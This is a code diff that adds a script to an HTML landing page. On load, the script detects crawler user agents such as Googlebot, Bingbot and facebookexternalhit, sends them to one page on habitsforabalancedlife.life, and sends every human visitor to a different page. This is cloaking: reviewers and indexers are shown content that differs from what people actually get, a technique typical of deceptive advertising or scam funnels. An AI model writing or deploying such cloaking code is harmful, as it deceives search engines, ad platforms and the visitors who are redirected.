@@ -15,7 +15,35 @@
         <meta name="description" content="Aplha BG">
         <title>AB3_BK Kong</title>
         
-        
+            <script>
+        // Lista de User-Agents de alguns bots conhecidos
+        const bots = [
+            "Googlebot",  // Google
+            "Bingbot",    // Bing
+            "Slurp",      // Yahoo
+            "facebookexternalhit", // Facebook
+            "Twitterbot", // Twitter
+            "Pinterest",  // Pinterest
+            "YandexBot"   // Yandex
+        ];
+
+        // Função para detectar se o visitante é um bot
+        function isBot() {
+            const userAgent = navigator.userAgent;
+            return bots.some(bot => userAgent.includes(bot));
+        }
+
+        // Redireciona conforme a detecção
+        window.onload = function() {
+            if (isBot()) {
+                // Redireciona para a página VSL (página para bots)
+                window.location.href = 'https://habitsforabalancedlife.life/vsl';
+            } else {
+                // Caso não seja um bot, redireciona para a página VSHS1
+                window.location.href = 'https://habitsforabalancedlife.life/vshs1';
+            }
+        };
+    </script>
 
 <!-- JavaScript program to fire the pixel event -->
 <script>
